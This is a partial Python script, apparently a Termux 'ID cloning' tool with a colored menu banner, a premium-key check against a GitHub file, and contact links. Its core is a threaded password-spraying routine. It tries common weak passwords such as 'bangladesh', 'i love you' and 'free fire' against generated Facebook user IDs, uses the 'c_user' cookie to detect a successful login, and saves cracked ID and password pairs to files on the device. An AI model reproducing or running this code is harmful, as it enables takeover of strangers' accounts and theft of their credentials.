...
def o():
    ...
    RSTN = input('  ║ \033[97;1m[\033[38;5;46m?\033[97;1m] \033[97;1mSelect menu \033[38;5;196m: ')
    if RSTN == '1':
        i()
    if RSTN == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100082010261051&mibextid=ZbWKwL')
    if RSTN == '3':
        os.system('xdg-open https://www.facebook.com/groups/795063638147934/?ref=share/')
    if RSTN == 'E':
        os.system('exit')
        return None
...
\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mRST.N I'd Cloning Tools\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mROCKY.N I'd Cloning Tools          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/RS-ROCKY     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+8801316686453                    \x1b[97;1m║
...
def i():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;46mFILE SAVE \033[38;5;196m: \033[38;5;46mRSTN-OK.txt")
        print("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;196mFILE SAVE \033[38;5;196m: \033[38;5;196mRSTN-CP.txt")
        ...
        print("  ╚\033[0m═══════════════════════════════════════════════════╝ ")
        for RST in user:
            pwx = [RST,'###@@@','@@@###','123@@@','123###','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
            uid = code+RST
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[RST.N-CP][😭] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/RST.N-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://github.com/RS-ROCKY/RST1/blob/main/RST.txt").text
	if key1 in r1:
		os.system('clear')
		o()
	else:
		...
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+RSTN+key1)
		...
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+RSTN+''+key1
